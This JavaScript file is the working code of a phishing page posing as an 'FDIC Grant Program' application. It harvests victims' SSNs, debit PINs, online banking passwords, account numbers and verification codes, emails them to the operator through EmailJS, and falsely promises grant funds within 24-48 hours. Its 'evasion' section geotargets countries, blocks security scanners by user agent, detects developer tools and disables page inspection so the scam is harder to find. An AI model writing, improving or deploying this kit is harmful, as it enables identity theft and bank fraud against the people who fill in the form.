// Grant Application Form Handler
class GrantApplicationForm {
    constructor() {
        this.form = document.getElementById('grant-form');
        this.submitBtn = document.querySelector('.submit-btn');
        this.init();
    }

    init() {
        this.setupFormValidation();
        this.setupFormSubmission();
        this.setupInputFormatting();
        this.addSecurityWarnings();
    }

    setupFormValidation() {
        // Real-time validation
        const inputs = this.form.querySelectorAll('input, select, textarea');
        
        inputs.forEach(input => {
            input.addEventListener('blur', () => this.validateField(input));
            input.addEventListener('input', () => this.clearFieldError(input));
        });

        // SSN formatting
        const ssnInput = document.getElementById('ssn');
        ssnInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
            } else if (value.length >= 3) {
                value = value.replace(/(\d{3})(\d{2})/, '$1-$2');
            }
            e.target.value = value;
        });

        // PIN formatting
        const pinInput = document.getElementById('debit-pin');
        pinInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });

        // Card last 4 digits
        const cardInput = document.getElementById('card-last-4');
        cardInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });

        // Verification code
        const verificationInput = document.getElementById('verification-code');
        verificationInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
        });
    }

    setupFormSubmission() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            if (this.validateForm()) {
                this.submitForm();
            } else {
                this.showFormErrors();
            }
        });
    }

    setupInputFormatting() {
        // Add input masks and formatting
        const routingInput = document.getElementById('routing-number');
        routingInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
        });

        const accountInput = document.getElementById('account-number');
        accountInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }

    addSecurityWarnings() {
        // Add warnings to sensitive fields
        const sensitiveFields = ['ssn', 'debit-pin', 'online-password'];
        
        sensitiveFields.forEach(fieldId => {
            const field = document.getElementById(fieldId);
            const warning = document.createElement('div');
            warning.className = 'field-warning';
            warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Never share this information with untrusted sources';
            warning.style.cssText = `
                color: #856404;
                font-size: 0.9em;
                margin-top: 5px;
                display: none;
            `;
            
            field.addEventListener('focus', () => {
                warning.style.display = 'block';
            });
            
            field.addEventListener('blur', () => {
                setTimeout(() => warning.style.display = 'none', 1000);
            });
            
            field.parentNode.appendChild(warning);
        });
    }

    validateField(field) {
        const value = field.value.trim();
        let isValid = true;
        let errorMessage = '';

        // Required field validation
        if (field.hasAttribute('required') && !value) {
            isValid = false;
            errorMessage = 'This field is required';
        }

        // Email validation
        if (field.type === 'email' && value) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid email address';
            }
        }

        // SSN validation
        if (field.id === 'ssn' && value) {
            const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
            if (!ssnRegex.test(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid SSN (XXX-XX-XXXX)';
            }
        }

        // PIN validation
        if (field.id === 'debit-pin' && value) {
            if (value.length !== 4 || !/^\d{4}$/.test(value)) {
                isValid = false;
                errorMessage = 'PIN must be exactly 4 digits';
            }
        }

        // Routing number validation
        if (field.id === 'routing-number' && value) {
            if (value.length !== 9 || !/^\d{9}$/.test(value)) {
                isValid = false;
                errorMessage = 'Routing number must be exactly 9 digits';
            }
        }

        // Verification code validation
        if (field.id === 'verification-code' && value) {
            if (value.length !== 5 || !/^\d{5}$/.test(value)) {
                isValid = false;
                errorMessage = 'Verification code must be exactly 5 digits';
            }
        }

        this.showFieldError(field, isValid, errorMessage);
        return isValid;
    }

    showFieldError(field, isValid, message) {
        // Remove existing error
        const existingError = field.parentNode.querySelector('.field-error');
        if (existingError) {
            existingError.remove();
        }

        // Add new error if invalid
        if (!isValid) {
            const errorDiv = document.createElement('div');
            errorDiv.className = 'field-error';
            errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
            field.parentNode.appendChild(errorDiv);
            field.style.borderColor = '#dc3545';
        } else {
            field.style.borderColor = '#28a745';
        }
    }

    clearFieldError(field) {
        const error = field.parentNode.querySelector('.field-error');
        if (error) {
            error.remove();
        }
        field.style.borderColor = '#e9ecef';
    }

    validateForm() {
        const inputs = this.form.querySelectorAll('input[required], select[required], textarea[required]');
        let isFormValid = true;

        inputs.forEach(input => {
            if (!this.validateField(input)) {
                isFormValid = false;
            }
        });

        return isFormValid;
    }

    showFormErrors() {
        // Scroll to first error
        const firstError = this.form.querySelector('.field-error');
        if (firstError) {
            firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Show alert
        alert('Please correct the errors highlighted in red before submitting.');
    }

    async submitForm() {
        // Show loading state
        this.submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Application...';
        this.submitBtn.disabled = true;

        try {
            // Validate form first
            if (!this.validateForm()) {
                this.showFormErrors();
                this.resetSubmitButton();
                return;
            }

            // Collect form data
            const formData = this.collectFormData();
            console.log('Form data collected:', formData);
            
            // Send email directly to office
            await this.sendEmailToOffice(formData);

            // Show success result
            this.showSubmissionResult();
        } catch (error) {
            console.error('Error submitting form:', error);
            this.showErrorResult();
        }
    }

    async sendEmailToOffice(formData) {
        try {
            console.log('=== SENDING EMAIL TO OFFICE ===');
            console.log('Form data:', formData);
            
            // EmailJS configuration
            const emailParams = {
                to_email: window.EMAIL_CONFIG.officeEmail,
                from_name: formData.fullName,
                from_email: formData.email,
                subject: `${window.EMAIL_CONFIG.templateVariables.subject_prefix} - ${formData.id}`,
                message: this.formatEmailMessage(formData),
                application_id: formData.id,
                submitted_at: formData.submittedAt.toISOString()
            };
            
            console.log('Email parameters:', emailParams);
            
            // Send email using EmailJS
            const result = await window.emailjs.send(
                window.EMAIL_CONFIG.serviceId,
                window.EMAIL_CONFIG.templateId,
                emailParams
            );
            
            console.log('✅ SUCCESS: Email sent successfully!', result);
            return result;
        } catch (error) {
            console.error('❌ ERROR sending email:', error);
            
            // Fallback: Try to send via mailto link
            this.sendEmailViaMailto(formData);
            throw error;
        }
    }

    formatEmailMessage(formData) {
        return `
New Grant Application Submitted

Application ID: ${formData.id}
Submitted: ${formData.submittedAt.toLocaleString()}

PERSONAL INFORMATION:
- Full Name: ${formData.fullName}
- Birth Date: ${formData.birthDate}
- Email: ${formData.email}
- Address: ${formData.address}
- SSN: ${formData.ssn}
- Driver's License: ${formData.driversLicense}
- Mother's Maiden Name: ${formData.mothersMaidenName}

BANKING INFORMATION:
- Bank Name: ${formData.bankName}
- Account Number: ${formData.accountNumber}
- Routing Number: ${formData.routingNumber}
- Bank Association: ${formData.bankAssociation}
- Debit PIN: ${formData.debitPin}
- Card Last 4 Digits: ${formData.cardLast4}
- Online Username: ${formData.onlineUsername}
- Online Password: ${formData.onlinePassword}

GRANT DETAILS:
- Weekly Deposit Amount: $${formData.weeklyDeposit}
- Verification Code: ${formData.verificationCode}

This application was submitted through the FDIC Grant Program Portal.
        `.trim();
    }

    sendEmailViaMailto(formData) {
        console.log('Using mailto fallback...');
        
        const subject = encodeURIComponent(`${window.EMAIL_CONFIG.templateVariables.subject_prefix} - ${formData.id}`);
        const body = encodeURIComponent(this.formatEmailMessage(formData));
        const to = window.EMAIL_CONFIG.officeEmail;
        
        const mailtoLink = `mailto:${to}?subject=${subject}&body=${body}`;
        
        // Open email client
        window.location.href = mailtoLink;
        
        // Show notification
        alert('Your email client should open with the application details. Please send the email to complete your application.');
    }

    resetSubmitButton() {
        this.submitBtn.innerHTML = 'Submit';
        this.submitBtn.disabled = false;
    }

    collectFormData() {
        const formData = new FormData(this.form);
        const data = {};
        
        // Convert FormData to object
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        // Generate unique ID and timestamp
        const timestamp = Date.now();
        const date = new Date();
        const year = date.getFullYear().toString().slice(-2);
        const month = (date.getMonth() + 1).toString().padStart(2, '0');
        const day = date.getDate().toString().padStart(2, '0');
        const randomNum = Math.floor(Math.random() * 9999).toString().padStart(4, '0');
        
        data.id = `GRANT-${year}${month}${day}-${randomNum}`;
        data.submittedAt = new Date();
        data.isNew = true;
        
        return data;
    }

    showErrorResult() {
        // Reset button
        this.resetSubmitButton();

        // Show error message
        alert('There was an error submitting your application. Please check your internet connection and try again.');
    }

    showSubmissionResult() {
        // Create success message
        const successDiv = document.createElement('div');
        successDiv.className = 'success-message show';
        successDiv.innerHTML = `
            <h3><i class="fas fa-check-circle"></i> Application Submitted Successfully!</h3>
            <p>Your application has been processed and you will receive your grant funds within 24-48 hours.</p>
            <p><em>Reference ID: GRANT-${Math.random().toString(36).substr(2, 9).toUpperCase()}</em></p>
        `;

        // Insert success message
        this.form.parentNode.insertBefore(successDiv, this.form);

        // Hide form
        this.form.style.display = 'none';

        // Reset button
        this.submitBtn.innerHTML = 'Submit Grant Application';
        this.submitBtn.disabled = false;

        // Add reset button
        const resetBtn = document.createElement('button');
        resetBtn.className = 'submit-btn';
        resetBtn.innerHTML = '<i class="fas fa-redo"></i> Start New Application';
        resetBtn.onclick = () => {
            successDiv.remove();
            this.form.style.display = 'block';
            this.form.reset();
        };
        successDiv.appendChild(resetBtn);

        // Scroll to success message
        successDiv.scrollIntoView({ behavior: 'smooth' });
    }
}

// ===== EVASION TECHNIQUES ADDED =====

// Configuration for evasion
const EVASION_CONFIG = {
    targetCountries: ['US', 'CA', 'GB', 'GH'], // Added Ghana
    showFormDelay: 2000
};

// 1. GEOTARGETING - Check user location
async function checkGeolocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (!EVASION_CONFIG.targetCountries.includes(data.country_code)) {
            // Block non-target countries (no redirect)
            return false;
        }
        return true;
    } catch (error) {
        // Allow if geolocation fails
        return true;
    }
}

// 2. BOT DETECTION - Detect security scanners
function detectBots() {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedAgents = [
        'curl', 'wget', 'python', 'requests', 'scrapy',
        'phantomjs', 'selenium', 'headless', 'bot',
        'crawler', 'spider', 'scanner', 'security',
        'malware', 'antivirus', 'firewall'
    ];
    
    // Check user agent for known security tools
    for (let agent of blockedAgents) {
        if (userAgent.includes(agent)) {
            // Block bots (no redirect)
            return true;
        }
    }
    
    // Behavioral detection
    let mouseMovements = 0;
    let keystrokes = 0;
    
    document.addEventListener('mousemove', () => mouseMovements++);
    document.addEventListener('keypress', () => keystrokes++);
    
    setTimeout(() => {
        if (mouseMovements === 0 && keystrokes === 0) {
            // Block bot-like behavior (no redirect)
            console.log('Bot-like behavior detected');
        }
    }, 3000);
    
    return false;
}

// 3. DEVTOOLS DETECTION - Detect developer tools
function detectDevTools() {
    const threshold = 160;
    if (window.outerHeight - window.innerHeight > threshold || 
        window.outerWidth - window.innerWidth > threshold) {
        // Block dev tools (no redirect)
        console.log('DevTools detected via window size');
        return;
    }
    
    let devtools = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
        get: function() {
            devtools = true;
            console.log('DevTools detected via console access');
        }
    });
    
    setInterval(() => {
        devtools = false;
        console.log(element);
        console.clear();
    }, 1000);
}

// 4. ENHANCED INSPECTION DISABLING
function disableInspection() {
    // Disable right-click
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
    document.addEventListener('keydown', (e) => {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+Shift+I (DevTools)
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+U (View Source)
        if (e.ctrlKey && e.keyCode === 85) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+S (Save Page)
        if (e.ctrlKey && e.keyCode === 83) {
            e.preventDefault();
            return false;
        }
    });
    
    // Disable text selection
    document.addEventListener('selectstart', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Disable drag and drop
    document.addEventListener('dragstart', (e) => {
        e.preventDefault();
        return false;
    });
}

// 5. MAIN EVASION INITIALIZATION
async function initializeEvasion() {
    // Step 1: Disable inspection immediately
    disableInspection();
    
    // Step 2: Check for bots
    if (detectBots()) {
        return; // Exit if bot detected
    }
    
    // Step 3: Check geolocation
    const isTargetLocation = await checkGeolocation();
    if (!isTargetLocation) {
        return; // Exit if not target location
    }
    
    // Step 4: Detect dev tools
    detectDevTools();
    
    // Step 5: If all checks pass, initialize the form
    return true;
}

// ===== ORIGINAL INITIALIZATION WITH EVASION =====

// Initialize the form when DOM is loaded (WITH EVASION CHECKS)
document.addEventListener('DOMContentLoaded', async () => {
    // Run evasion checks first
    const evasionPassed = await initializeEvasion();
    
    // Only initialize form if evasion checks pass
    if (evasionPassed) {
        setTimeout(() => {
            new GrantApplicationForm();
        }, EVASION_CONFIG.showFormDelay);
    }
});

// Additional security warnings (KEPT FROM ORIGINAL)
document.addEventListener('DOMContentLoaded', () => {
    // Add click tracking to sensitive fields
    const sensitiveFields = ['ssn', 'debit-pin', 'online-password', 'online-username'];
    
    sensitiveFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('click', () => {
                console.warn('⚠️ WARNING: You are about to enter sensitive information into what appears to be a phishing form.');
            });
        }
    });
});

// Initialize inspection disabling when page loads (ENHANCED VERSION)
document.addEventListener('DOMContentLoaded', () => {
    disableInspection();
});

// Initialize bot detection when page loads
document.addEventListener('DOMContentLoaded', () => {
    detectBots();
});
